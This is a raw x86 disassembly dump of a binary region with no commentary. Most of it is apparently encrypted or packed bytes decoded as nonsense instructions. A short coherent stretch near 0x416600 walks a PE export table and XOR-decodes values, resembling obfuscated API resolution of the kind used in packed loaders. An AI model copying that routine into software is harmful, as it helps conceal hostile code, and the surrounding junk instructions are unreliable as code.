  416184:	rcl    BYTE PTR [ecx+0x6fba0f8a],cl
  41618a:	mov    WORD PTR [edi],es
  41618c:	or     esp,DWORD PTR [edx+ebx*2+0xed57055]
  416193:	icebp  
  416194:	clc    
  416195:	inc    esp
  416196:	add    al,0x8a
  416198:	std    
  416199:	mov    dh,0x46
  41619b:	aaa    
  41619c:	adc    esi,DWORD PTR [ebx]
  41619e:	stos   BYTE PTR es:[edi],al
  41619f:	shr    DWORD PTR [edx-0x18],cl
  4161a2:	jl     0x41612c
  4161a4:	jg     0x41621f
  4161a6:	pushf  
  4161a7:	cli    
  4161a8:	pop    edi
  4161a9:	aaa    
  4161aa:	ins    BYTE PTR es:[edi],dx
  4161ab:	fs mov ch,0x24
  4161ae:	jmp    0x50bf:0x2024355b
  4161b5:	out    dx,al
  4161b6:	pop    ds
  4161b7:	(bad)  
  4161b8:	gs pop es
  4161ba:	stos   BYTE PTR es:[edi],al
  4161bb:	aas    
  4161bc:	sbb    bl,BYTE PTR [ebp+0x45]
  4161bf:	addr16 cmp al,0xce
  4161c2:	out    0xb4,eax
  4161c4:	stos   BYTE PTR es:[edi],al
  4161c5:	ds xchg ebp,eax
  4161c7:	or     DWORD PTR [ecx-0x23],ebx
  4161ca:	lea    edi,[ecx-0x7e]
  4161cd:	lea    esi,[ecx-0x1e]
  4161d0:	fistp  QWORD PTR [esi+0x18dd287]
  4161d6:	push   0x21
  4161d8:	inc    ebx
  4161d9:	xbegin 0x81712986
  4161df:	jmp    0xd215:0x5a1b3e6d
  4161e6:	push   ebx
  4161e7:	xor    esi,0x8f4e9536
  4161ed:	push   ds
  4161ee:	call   0xbeb3:0xefba6d37
  4161f5:	jnp    0x416205
  4161f7:	lds    esp,FWORD PTR [edi-0x31]
  4161fa:	icebp  
  4161fb:	xchg   ecx,eax
  4161fc:	idiv   edi
  4161fe:	sti    
  4161ff:	aam    0x45
  416201:	mov    edi,0x15d931a5
  416206:	pop    edi
  416207:	lahf   
  416208:	push   0x1c84bb6a
  41620d:	or     al,0xba
  41620f:	cmp    ch,ch
  416211:	or     eax,0xba14b13f
  416216:	sbb    DWORD PTR [esi],edi
  416218:	pop    ebx
  416219:	stos   DWORD PTR es:[edi],eax
  41621a:	cs out dx,eax
  41621c:	fadd   st(3),st
  41621e:	mov    al,0x9d
  416220:	iret   
  416221:	call   0x8e41:0x78dd1b27
  416228:	lock jno 0x416266
  41622b:	sub    ebx,DWORD PTR [esp+ebx*1+0x3c]
  41622f:	xchg   esp,eax
  416230:	pop    es
  416231:	mov    ecx,0x2c81ed9b
  416236:	les    eax,FWORD PTR [esi+0x4fedd509]
  41623c:	xchg   ebx,eax
  41623d:	sbb    esp,edi
  41623f:	dec    eax
  416240:	mov    esp,0x556e7ef7
  416245:	and    eax,0x81e032dd
  41624a:	cmp    BYTE PTR [ebx+eax*1],ch
  41624d:	xlat   BYTE PTR ds:[ebx]
  41624e:	xchg   BYTE PTR [ebx+0x27aa8e6a],bl
  416254:	cld    
  416255:	mov    al,0x4e
  416257:	and    al,0x2a
  416259:	mov    ebx,0x71ee0f61
  41625e:	test   esp,edi
  416260:	sub    BYTE PTR [esi],dl
  416262:	xchg   edx,eax
  416263:	sbb    ah,BYTE PTR [esi]
  416265:	and    DWORD PTR [edi+edi*4],esp
  416268:	inc    esp
  416269:	fild   QWORD PTR [esi-0xef2ad6]
  41626f:	adc    eax,DWORD PTR [eax]
  416271:	jno    0x4162ee
  416273:	pop    ds
  416274:	sbb    al,0xdf
  416276:	jge    0x416201
  416278:	mov    al,ds:0xf6cfd22e
  41627d:	cwde   
  41627e:	fld    QWORD PTR [esi+0x42af33]
  416284:	(bad)  
  416285:	xlat   BYTE PTR ds:[ebx]
  416286:	push   edx
  416287:	xor    al,BYTE PTR [ebx+0x44]
  41628a:	push   cs
  41628b:	cmc    
  41628c:	pushf  
  41628d:	cwde   
  41628e:	jae    0x41621b
  416290:	and    BYTE PTR [edi-0x6d085079],0x99
  416297:	push   ebx
  416298:	(bad)  
  41629a:	mov    eax,0xa49036f9
  41629f:	sar    BYTE PTR [eax+0x2e875774],1
  4162a5:	es loop 0x416269
  4162a8:	inc    edi
  4162a9:	repz add cl,BYTE PTR [ebx]
  4162ac:	mov    ch,0x4
  4162ae:	xchg   ebp,eax
  4162af:	ds fxch st(0)
  4162b2:	xchg   esp,eax
  4162b3:	(bad)  
  4162b5:	repnz int 0xf
  4162b8:	ins    BYTE PTR es:[edi],dx
  4162b9:	inc    esp
  4162ba:	xlat   BYTE PTR ds:[ebx]
  4162bb:	xchg   ebp,eax
  4162bc:	and    eax,0xf6c817eb
  4162c1:	shld   ecx,esi,cl
  4162c4:	adc    DWORD PTR [esi-0x490526b2],0x9d0414de
  4162ce:	xor    esp,DWORD PTR [ebx+0x693fa873]
  4162d4:	test   BYTE PTR [eax+ecx*4+0x38],bl
  4162d8:	mov    ds:0x1ae0a419,eax
  4162de:	add    ebx,ebx
  4162e0:	add    dl,BYTE PTR ds:0x2002e0b1
  4162e6:	dec    ebx
  4162e7:	jecxz  0x41627f
  4162e9:	rol    DWORD PTR [esi+ebx*4-0x56],1
  4162ed:	pop    ebx
  4162ee:	data16 mov ch,0xe7
  4162f1:	hlt    
  4162f2:	pop    ecx
  4162f3:	push   edx
  4162f4:	sbb    esi,DWORD PTR ds:0xd1f66180
  4162fa:	rol    BYTE PTR [ecx-0x5505f2e6],cl
  416300:	cld    
  416301:	inc    esi
  416302:	mov    ah,0xf
  416304:	les    esp,FWORD PTR [ebx-0x307a7f9b]
  41630a:	xchg   edi,eax
  41630b:	push   ecx
  41630c:	add    BYTE PTR [ebp+0x36ae8c1f],al
  416312:	push   ebx
  416313:	adc    DWORD PTR cs:[esi],esp
  416316:	cmc    
  416317:	call   FWORD PTR [edi-0x3584db2d]
  41631d:	dec    esp
  41631e:	jae    0x41637a
  416320:	mov    DWORD PTR ds:[edx-0x41],ebx
  416324:	jo     0x41630b
  416326:	xchg   edx,eax
  416327:	adc    BYTE PTR [ebp+0x2b],dl
  41632a:	mov    al,ds:0x8ca8a071
  41632f:	add    bl,BYTE PTR [ebp+0x71198e64]
  416335:	mov    dh,0xdb
  416337:	inc    edi
  416338:	inc    ebx
  416339:	push   0xd
  41633b:	retf   
  41633c:	mov    ebx,0x23abadda
  416341:	paddusw mm0,QWORD PTR [ebx]
  416344:	fld    st(0)
  416346:	std    
  416347:	pushf  
  416348:	retf   
  416349:	inc    esi
  41634a:	fucomi st,st(2)
  41634c:	popf   
  41634d:	call   0x8fe214ab
  416352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416353:	fcmovne st,st(5)
  416355:	pop    ebp
  416356:	xchg   DWORD PTR [edx],ecx
  416358:	jmp    0x41630f
  41635a:	adc    eax,0xf1310a1c
  41635f:	cs sahf 
  416361:	ja     0x416344
  416363:	mov    BYTE PTR [esi+ebp*1+0x11e8efcd],bh
  41636a:	js     0x41634b
  41636c:	push   ebx
  41636d:	clc    
  41636e:	sar    bl,1
  416370:	fild   QWORD PTR ds:0x4adc2f54
  416376:	retf   0x926
  416379:	and    al,0xed
  41637b:	jl     0x416390
  41637d:	adc    BYTE PTR [edi-0x2ae6d3e8],cl
  416383:	out    0x89,eax
  416385:	repnz mov DWORD PTR [eax+0x79c6ef84],ebp
  41638c:	and    esi,edi
  41638e:	dec    ebx
  41638f:	cmp    DWORD PTR [edx-0x2e],ecx
  416392:	cmp    DWORD PTR [ecx+0x4],esi
  416395:	jb     0x416377
  416397:	mov    bh,0xa2
  416399:	mov    dh,0xb7
  41639b:	adc    al,bl
  41639d:	add    eax,0x1bdfd9ef
  4163a2:	cli    
  4163a3:	in     eax,0xf1
  4163a5:	outs   dx,BYTE PTR ds:[esi]
  4163a6:	bound  edi,QWORD PTR [ecx+0x3d66dd6d]
  4163ac:	shl    DWORD PTR [eax-0x6bb740c0],cl
  4163b2:	inc    edx
  4163b3:	out    dx,eax
  4163b4:	call   0x187b:0x4769779a
  4163bb:	push   0xb58342d
  4163c0:	push   ebp
  4163c1:	dec    edi
  4163c2:	fbld   TBYTE PTR [ebp+0x48]
  4163c5:	dec    esp
  4163c6:	adc    DWORD PTR [edx],edx
  4163c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c9:	pop    ecx
  4163ca:	fwait
  4163cb:	cmp    eax,0x6d05ff91
  4163d0:	retf   0x2fbd
  4163d3:	ret    
  4163d4:	push   ds
  4163d5:	pushf  
  4163d6:	ret    
  4163d7:	pop    ss
  4163d8:	ror    DWORD PTR [ebp-0x38a148cb],0x9e
  4163df:	jl     0x416438
  4163e1:	imul   BYTE PTR [esi]
  4163e3:	mov    edx,DWORD PTR [ecx-0x7f]
  4163e6:	mov    esi,0x147a9791
  4163eb:	inc    edx
  4163ec:	xor    dl,BYTE PTR [edx]
  4163ee:	fimul  DWORD PTR [edi+0x573889fe]
  4163f4:	xlat   BYTE PTR ds:[ebx]
  4163f5:	(bad)  
  4163f6:	adc    DWORD PTR [esi+0x4e],0x6f81973e
  4163fd:	fistp  QWORD PTR [edx+0xf1cb256]
  416403:	push   ebp
  416404:	sahf   
  416405:	push   esi
  416406:	(bad)
  416409:	jl     0x416434
  41640b:	cli    
  41640c:	jg     0x4163fd
  41640e:	aam    0x53
  416410:	mul    esi
  416412:	retf   
  416413:	stos   BYTE PTR es:[edi],al
  416414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416415:	jge    0x416428
  416417:	fadd   QWORD PTR [esi]
  416419:	xchg   ecx,eax
  41641a:	pop    edx
  41641b:	outs   dx,BYTE PTR ds:[esi]
  41641c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41641d:	or     al,0xfd
  41641f:	mov    eax,0xf8e91e26
  416424:	xchg   edi,eax
  416425:	scas   al,BYTE PTR es:[edi]
  416426:	xchg   esi,eax
  416427:	neg    DWORD PTR [edi]
  416429:	inc    edi
  41642a:	sbb    eax,DWORD PTR [ebx-0x5d]
  41642d:	xor    ecx,DWORD PTR [ebx+0x35]
  416430:	mov    cl,0x93
  416432:	push   es
  416433:	jge    0x416443
  416435:	or     BYTE PTR [edx+0xe],0xc5
  416439:	lods   eax,DWORD PTR ds:[esi]
  41643a:	dec    ebx
  41643b:	xchg   edi,eax
  41643c:	mov    bl,BYTE PTR [edx]
  41643e:	stos   DWORD PTR es:[edi],eax
  41643f:	inc    edi
  416440:	dec    esp
  416441:	and    eax,0x86e189d
  416446:	jp     0x4164aa
  416448:	push   ebp
  416449:	jbe    0x4164ab
  41644b:	inc    ecx
  41644c:	or     ebx,DWORD PTR [ecx-0x3eb00614]
  416452:	call   0x6afddf71
  416457:	out    0xe2,eax
  416459:	pop    edi
  41645a:	pop    esp
  41645b:	outs   dx,BYTE PTR ds:[esi]
  41645c:	cmp    DWORD PTR [ebp+0x10],0x9
  416460:	test   eax,0x9421ef09
  416465:	cmp    DWORD PTR [ecx],esp
  416467:	fisubr WORD PTR [ecx-0x514db89e]
  41646d:	mov    DWORD PTR [edi+0x35f26467],eax
  416473:	inc    edi
  416474:	adc    BYTE PTR [ebp-0xc],al
  416477:	cli    
  416478:	jmp    0xe29a:0x7335f069
  41647f:	xchg   BYTE PTR [ebp-0x62a64215],dl
  416485:	jb     0x4164c0
  416487:	jbe    0x4164e0
  416489:	mov    ds:0x307a42a1,al
  41648e:	mov    ds:0xece9eee3,eax
  416493:	pop    ebx
  416494:	add    BYTE PTR [edx-0xc],al
  416497:	cld    
  416498:	xchg   esp,ebx
  41649a:	or     BYTE PTR [esi+0x4],ah
  41649d:	xor    dh,BYTE PTR [esi-0x2ba4bdb]
  4164a3:	or     BYTE PTR [eax-0x546817f2],bh
  4164a9:	mov    ?,esi
  4164ab:	push   edx
  4164ac:	inc    edx
  4164ad:	je     0x4164e5
  4164af:	test   eax,0xb0403ec3
  4164b4:	xor    bl,BYTE PTR [ebp-0x2a]
  4164b7:	ret    
  4164b8:	mov    ecx,0x8a31bffc
  4164bd:	xchg   BYTE PTR [esi+0x35],ah
  4164c0:	inc    edi
  4164c1:	mov    ebx,0xfef13bdd
  4164c6:	inc    edx
  4164c7:	cmp    bh,bl
  4164c9:	cld    
  4164ca:	pushf  
  4164cb:	inc    edi
  4164cc:	mov    ds:0x96ab9cd0,al
  4164d1:	mov    ebx,0xefeaeea9
  4164d6:	mov    ecx,0xacfa4154
  4164db:	adc    ebx,ebx
  4164dd:	xchg   edi,eax
  4164de:	cmp    DWORD PTR [edx+0x6e],ecx
  4164e1:	mov    eax,ds:0xffbc756e
  4164e6:	sbb    al,0x79
  4164e8:	pop    ds
  4164e9:	ret    
  4164ea:	sbb    BYTE PTR [edi-0x32adf92c],0xb1
  4164f1:	rcr    eax,0xdd
  4164f4:	cmp    ecx,DWORD PTR [edi+edi*8-0x3626dcf2]
  4164fb:	(bad)  
  4164fc:	pop    ecx
  4164fd:	or     dh,BYTE PTR [ebx-0x272657df]
  416503:	cmp    ebx,DWORD PTR [esi]
  416505:	not    BYTE PTR [eax+0x251c29c6]
  41650b:	dec    dx
  41650d:	cmp    al,0xfa
  41650f:	je     0x41658d
  416511:	jl     0x416534
  416513:	stos   DWORD PTR es:[edi],eax
  416514:	es pop ss
  416516:	dec    ebx
  416517:	or     eax,0x1fc47357
  41651c:	pop    esi
  41651d:	mov    edx,0x6579544e
  416522:	mov    esi,0xb046b2d6
  416527:	mov    ebx,DWORD PTR [edi]
  416529:	aad    0x49
  41652b:	jne    0x4164da
  41652d:	neg    DWORD PTR [ebx+0x5c]
  416530:	aam    0xcc
  416532:	scas   al,BYTE PTR es:[edi]
  416533:	adc    esi,DWORD PTR [ecx]
  416535:	repz retf 
  416537:	dec    esp
  416538:	cmp    ch,bl
  41653a:	shl    BYTE PTR [edx-0x48],cl
  41653d:	pop    edi
  41653e:	jmp    0x502ca17b
  416543:	(bad)  
  416545:	xchg   edx,eax
  416546:	stc    
  416547:	data16 and al,0x53
  41654a:	inc    eax
  41654b:	mul    DWORD PTR cs:[ebp-0x75746840]
  416552:	add    edx,DWORD PTR [esi]
  416554:	lahf   
  416555:	push   ebp
  416556:	adc    ebx,ebx
  416558:	popf   
  416559:	adc    ebx,DWORD PTR [ebx]
  41655b:	or     eax,esp
  41655d:	dec    edi
  41655e:	lea    edi,[esi+0x2b]
  416561:	mov    al,ds:0xdbfee5bb
  416566:	cmp    al,0xff
  416568:	inc    esp
  416569:	loope  0x41657e
  41656b:	push   esi
  41656c:	sub    BYTE PTR [ebp+0x69],0xa8
  416570:	and    esp,DWORD PTR ds:0x7f1d7a7b
  416576:	jmp    0x21eb36fd
  41657b:	fwait
  41657c:	loop   0x4165c2
  41657e:	icebp  
  41657f:	push   ebp
  416580:	jae    0x41655d
  416582:	fs test eax,0xab86ce93
  416588:	mov    ebp,0x3bc56753
  41658d:	sbb    bl,BYTE PTR [ebx]
  41658f:	mov    al,BYTE PTR [ebx]
  416591:	shl    BYTE PTR [esi],0xa
  416594:	mov    BYTE PTR [ecx],dh
  416596:	icebp  
  416597:	adc    BYTE PTR [edi],ch
  416599:	les    ecx,FWORD PTR [ebp-0xe469a61]
  41659f:	ds stos BYTE PTR es:[edi],al
  4165a1:	fucompp 
  4165a3:	xor    al,0xb5
  4165a5:	push   ebx
  4165a6:	cdq    
  4165a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a8:	test   al,0x99
  4165aa:	pop    di
  4165ac:	push   esi
  4165ad:	mov    BYTE PTR [ecx+ebx*4],ch
  4165b0:	call   0x739ad0bb
  4165b5:	mov    al,0x93
  4165b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b8:	pop    ss
  4165b9:	push   edi
  4165ba:	shr    BYTE PTR [ecx-0x4f],cl
  4165bd:	(bad)  
  4165be:	jle    0x416623
  4165c0:	cs enter 0x401,0x83
  4165c5:	push   ebx
  4165c6:	and    bh,BYTE PTR [ebp+0x22]
  4165c9:	pop    edi
  4165ca:	sbb    DWORD PTR [esi],esi
  4165cc:	pop    ebp
  4165cd:	lds    eax,FWORD PTR [eax]
  4165cf:	mov    ds,ebp
  4165d1:	add    al,0xd
  4165d3:	xlat   BYTE PTR cs:[ebx]
  4165d5:	sar    esp,1
  4165d7:	add    edi,DWORD PTR [edx]
  4165d9:	lds    ecx,FWORD PTR [esi]
  4165db:	or     ebp,DWORD PTR [ebx]
  4165dd:	test   al,0x8a
  4165df:	push   esi
  4165e0:	(bad)  
  4165e1:	pop    esi
  4165e2:	ret    
  4165e3:	jmp    0x81b1:0x47ee5307
  4165ea:	xor    eax,ebp
  4165ec:	adc    DWORD PTR [esi],edx
  4165ee:	dec    esi
  4165ef:	sub    DWORD PTR [ebp+0x40a7208a],edx
  4165f5:	xor    eax,0x7bfc01b5
  4165fa:	jne    0x416622
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dl,dl
  416673:	retf   
  416674:	fadd   DWORD PTR [edi-0x25]
  416677:	and    esp,DWORD PTR [ecx+0x62]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	fwait
  41667f:	rcr    DWORD PTR ds:0x11f80cd,1
  416685:	mov    esi,fs
  416687:	mov    ss,WORD PTR [eax+0x48]
  41668a:	jmp    0x82c9:0xab870adf
  416691:	adc    al,0xb3
  416693:	adc    ebp,DWORD PTR [ecx+0x7c]
  416696:	or     cl,BYTE PTR [eax+edx*8-0x1752a9b]
  41669d:	inc    edi
  41669e:	xor    al,0x69
  4166a0:	cmp    eax,ebp
  4166a2:	xchg   DWORD PTR [ebp-0xa],ebp
  4166a5:	loope  0x416665
  4166a7:	adc    DWORD PTR [esi+0x2],esi
  4166aa:	xchg   ecx,eax
  4166ab:	xchg   esp,eax
  4166ac:	rol    dh,0xc5
  4166af:	inc    edi
  4166b0:	sar    DWORD PTR [edi+0x6a7fd150],0x22
  4166b7:	adc    DWORD PTR [esi+ecx*4-0x54],edi
  4166bb:	mov    WORD PTR [esi-0x635f26fe],ss
  4166c1:	jb     0x41668e
  4166c3:	outs   dx,DWORD PTR ds:[esi]
  4166c4:	in     eax,0xfd
  4166c6:	sub    al,0xfb
  4166c8:	fimul  DWORD PTR [edi]
  4166ca:	aad    0x4
  4166cc:	jno    0x4166df
  4166ce:	inc    ecx
  4166cf:	cmp    ah,BYTE PTR [edx]
  4166d1:	inc    eax
  4166d2:	dec    ebx
  4166d3:	je     0x4166de
  4166d5:	das    
  4166d6:	sub    eax,0x2aae423d
  4166db:	lds    edi,FWORD PTR [esi+0x72aea21e]
  4166e1:	in     eax,0xf0
  4166e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e4:	add    dh,dl
  4166e6:	mov    eax,ds:0xe58b1a8a
  4166eb:	xor    esp,DWORD PTR [eax-0x8]
  4166ee:	lds    edx,FWORD PTR [ebp-0x27]
  4166f1:	mov    ds:0xab785a8c,eax
  4166f6:	mov    ebx,0xd64f5ea5
  4166fb:	pop    eax
  4166fc:	lods   al,BYTE PTR ds:[esi]
  4166fd:	sbb    cl,BYTE PTR [ebx+0x4f34947c]
  416703:	jbe    0x4166c9
  416705:	xchg   esp,eax
  416706:	call   0xa2d0:0x5477e632
  41670d:	mov    edi,DWORD PTR [edi+0x43]
  416710:	inc    edi
  416711:	(bad)  [ebp-0x6e74a3a7]
  416717:	fwait
  416718:	mov    ebp,0x6b402ab1
  41671d:	cmp    ch,BYTE PTR [esi+0x5b]
  416720:	sub    eax,0x64782213
  416725:	cwde   
  416726:	cmp    BYTE PTR [edx-0x73],ch
  416729:	fs fs add al,0x58
  41672d:	inc    esi
  41672e:	scas   eax,DWORD PTR es:[edi]
  41672f:	jecxz  0x41679e
  416731:	leave  
  416732:	cmc    
  416733:	mov    esp,0x49adf5ec
  416738:	mov    ds:0xa9441f6c,eax
  41673d:	retf   
  41673e:	pop    esp
  41673f:	mov    ?,edi
  416741:	(bad)  
  416742:	push   esi
  416743:	fisttp DWORD PTR [ecx+0x5f6cd307]
  416749:	xlat   BYTE PTR ds:[ebx]
  41674a:	test   BYTE PTR [esi+0x70c323be],bl
  416750:	cmp    eax,edx
  416752:	lods   eax,DWORD PTR ds:[esi]
  416753:	jae    0x4167ac
  416755:	xchg   ebx,eax
  416756:	adc    ecx,DWORD PTR fs:[ecx+0x7e]
  41675a:	call   0x2e79680
  41675f:	adc    BYTE PTR [ecx-0x32ae485c],dh
  416765:	and    dh,BYTE PTR [ecx+ebp*4-0x52]
  416769:	mov    cl,0xb2
  41676b:	pop    ecx
  41676c:	jne    0x416723
  41676e:	cmp    bh,ch
  416770:	cld    
  416771:	mov    cl,0xcc
  416773:	mov    eax,ds:0x923bfd6c
  416778:	jnp    0x4167e8
  41677a:	jns    0x416760
  41677c:	xchg   esp,eax
  41677d:	outs   dx,DWORD PTR ds:[esi]
  41677e:	ins    BYTE PTR es:[edi],dx
  41677f:	xchg   DWORD PTR [ecx],edi
  416781:	push   ecx
  416782:	xchg   BYTE PTR [ebp-0x2a37ff2f],bh
  416788:	js     0x416741
  41678a:	jmp    0x4167ab
  41678c:	pop    esi
  41678d:	das    
  41678e:	iret   
  41678f:	gs pop edx
  416791:	or     ah,BYTE PTR [edx]
  416793:	ins    BYTE PTR es:[edi],dx
  416794:	sub    BYTE PTR [ebp+0x26],al
  416797:	push   0x785ebaa7
  41679c:	and    al,0x55
  41679e:	add    ch,dl
  4167a0:	mov    esi,DWORD PTR [edi+0x39306522]
  4167a6:	jo     0x416813
  4167a8:	in     eax,dx
  4167a9:	dec    esi
  4167aa:	std    
  4167ab:	es xchg ecx,eax
  4167ad:	cld    
  4167ae:	xchg   edi,eax
  4167af:	leave  
  4167b0:	add    esi,esi
  4167b2:	out    dx,al
  4167b3:	outs   dx,BYTE PTR ds:[esi]
  4167b4:	ds mov ecx,0x2721b6b7
  4167ba:	xor    eax,0x3bd35f68
  4167bf:	push   edx
  4167c0:	sti    
  4167c1:	leave  
  4167c2:	js     0x4167eb
  4167c4:	fsub   DWORD PTR ds:0x36992391
  4167ca:	and    ch,BYTE PTR [ecx+ecx*2]
  4167cd:	or     eax,0x3af431f0
  4167d2:	xchg   ebp,eax
  4167d3:	icebp  
  4167d4:	mov    esp,0xc35f9024
  4167d9:	mov    bl,0x15
  4167db:	enter  0x7acd,0x52
  4167df:	xchg   edi,eax
  4167e0:	xchg   DWORD PTR [eax+0x6a],ecx
  4167e3:	cdq    
  4167e4:	mov    ch,0x95
  4167e6:	mov    ebx,0xaa5e42f5
  4167eb:	dec    ecx
  4167ec:	pop    eax
  4167ed:	push   0xffffff89
  4167ef:	xor    al,0x66
  4167f1:	cli    
  4167f2:	jb     0x4167bc
  4167f4:	xor    BYTE PTR [ebp-0x65],al
  4167f7:	scas   al,BYTE PTR es:[edi]
  4167f8:	les    ebp,FWORD PTR [eax]
  4167fa:	rcr    DWORD PTR [ebp+0xd],cl
  4167fd:	ja     0x41682d
  4167ff:	cld    
  416800:	mov    esp,0x13b75ec3
  416805:	jecxz  0x4167f4
  416807:	mov    ebp,0x7a5faf6c
  41680c:	test   DWORD PTR [edx+0x463869f],esi
  416812:	enter  0xd9ef,0x60
  416816:	inc    esi
  416817:	and    edi,DWORD PTR [ebp+ebp*4+0x2d]
  41681b:	pop    ebx
  41681c:	and    DWORD PTR [esi-0x4],ebp
  41681f:	shl    DWORD PTR [eax+eax*2-0x18064b4f],1
  416826:	retf   0x690b
  416829:	enter  0x256a,0x5f
  41682d:	adc    DWORD PTR [eax],edx
  41682f:	(bad)  [edi-0x67]
  416833:	add    dl,BYTE PTR [ecx-0xcad95f1]
  416839:	cmp    al,0xcc
  41683b:	popa   
  41683c:	adc    eax,0xd95d025c
  416841:	mov    ebx,0xa094063b
  416846:	les    ebx,FWORD PTR ds:0x360de9d4
  41684c:	inc    ebx
  41684d:	pop    ebx
  41684e:	adc    BYTE PTR [esi],dh
  416850:	add    bh,ch
  416852:	add    DWORD PTR [esi*1+0x26ac65ab],esp
  416859:	xchg   ecx,eax
  41685a:	mov    dl,0xd9
  41685c:	aad    0x97
  41685e:	pop    ds
  41685f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416860:	fwait
  416861:	ror    BYTE PTR [eax-0x33aaf1b4],1
  416867:	xchg   esp,eax
  416868:	push   edx
  416869:	aas    
  41686a:	test   DWORD PTR [eax],ecx
  41686c:	jmp    0x3f66c9ee
  416871:	mov    eax,ds:0xab171b2d
  416876:	push   edx
  416877:	add    ebx,ecx
  416879:	xor    eax,0x43cbf438
  41687e:	xchg   ebp,eax
  41687f:	cmc    
  416880:	clc    
  416881:	push   eax
  416882:	mov    ebp,0xbf80bdc0
  416887:	jle    0x416837
  416889:	pop    eax
  41688a:	fdivr  QWORD PTR [ecx+0x66]
  41688d:	sbb    al,0x19
  41688f:	sbb    eax,0xffffffcd
  416892:	aad    0xb5
  416894:	add    esi,edx
  416896:	sti    
  416897:	lds    ebp,FWORD PTR [edi+edx*4+0x4f]
  41689b:	dec    esi
  41689c:	inc    esi
  41689d:	xchg   edi,eax
  41689e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41689f:	mov    dh,0x51
  4168a1:	dec    edx
  4168a2:	mov    ebx,0x3d98009e
  4168a7:	sub    DWORD PTR [esi-0x20b64f70],eax
  4168ad:	add    ecx,DWORD PTR [ebx-0x1c0305c6]
  4168b3:	push   eax
  4168b4:	jl     0x416932
  4168b6:	test   DWORD PTR [esi+0x5bb3d2ce],0x74084ec3
  4168c0:	loop   0x416898
  4168c2:	gs pop edx
  4168c4:	test   eax,0x3ce51483
  4168c9:	sub    edx,DWORD PTR [eax+0x1645c444]
  4168cf:	xlat   BYTE PTR ds:[ebx]
  4168d0:	daa    
  4168d1:	fcom   DWORD PTR [esi-0xe]
  4168d4:	cmp    eax,0x4b322910
  4168d9:	fdiv   st,st(3)
  4168db:	shr    BYTE PTR [esi+0x23cda8b6],0x34
  4168e2:	xchg   ecx,eax
  4168e3:	mov    WORD PTR [edx-0x2c],gs
  4168e6:	sahf   
  4168e7:	add    eax,0x1339e7a6
  4168ec:	loope  0x416908
  4168ee:	mov    ecx,ecx
  4168f0:	or     ecx,eax
  4168f2:	imul   bx,cx,0xffdb
  4168f6:	push   cs
  4168f7:	data16 add bl,bh
  4168fa:	pop    edx
  4168fb:	into   
  4168fc:	xor    esp,DWORD PTR [edx]
  4168fe:	das    
  4168ff:	nop
  416900:	dec    ebx
  416901:	fstp   QWORD PTR [ecx+esi*8-0x5a9fc388]
  416908:	pusha  
  416909:	adc    al,0x57
  41690b:	mov    dh,0x57
  41690d:	imul   ecx,DWORD PTR [ebx+ebp*4],0x1346fe9b
  416914:	cmp    eax,0xf411df65
  416919:	sbb    al,al
  41691b:	mov    esp,0x794780dd
  416920:	out    dx,al
  416921:	(bad)  
  416922:	cmp    ecx,DWORD PTR [ebx]
  416924:	xchg   esi,eax
  416925:	je     0x41699b
  416927:	stc    
  416928:	sbb    dl,BYTE PTR [edx-0x7a]
  41692b:	cmp    ecx,DWORD PTR [edi]
  41692d:	xchg   edi,eax
  41692e:	test   DWORD PTR [ebp+eax*2-0x48d37411],ecx
  416935:	xchg   esi,eax
  416936:	jecxz  0x4168d3
  416938:	or     eax,0xbec4a08d
  41693d:	retf   
  41693e:	add    BYTE PTR [edx],ch
  416940:	aad    0x63
  416942:	cs pop esp
  416944:	push   ebx
  416945:	xor    dh,dl
  416947:	jne    0x41692e
  416949:	in     al,dx
  41694a:	sbb    eax,0x9a290426
  41694f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416950:	adc    ebx,DWORD PTR [ebp+0x64]
  416953:	lds    ebx,FWORD PTR [ebx-0x3bcaa23f]
  416959:	mov    cl,0xd8
  41695b:	xor    esi,edi
  41695d:	iret   
  41695e:	iret   
  41695f:	jae    0x41699d
  416961:	xchg   esi,eax
  416962:	add    ecx,DWORD PTR [ebx+0x36]
  416965:	push   ds
  416966:	cmp    ebx,esi
  416968:	or     ebp,DWORD PTR [ecx+0x7549c2c1]
  41696e:	pop    es
  41696f:	lahf   
  416970:	xchg   ebp,eax
  416971:	inc    edi
  416972:	popa   
  416973:	cwde   
  416974:	mov    ah,dh
  416976:	adc    al,0xb0
  416978:	shl    DWORD PTR [eax-0x55],0x68
  41697c:	rol    DWORD PTR [ebp+edx*8+0x236c4c90],0xe
  416984:	pusha  
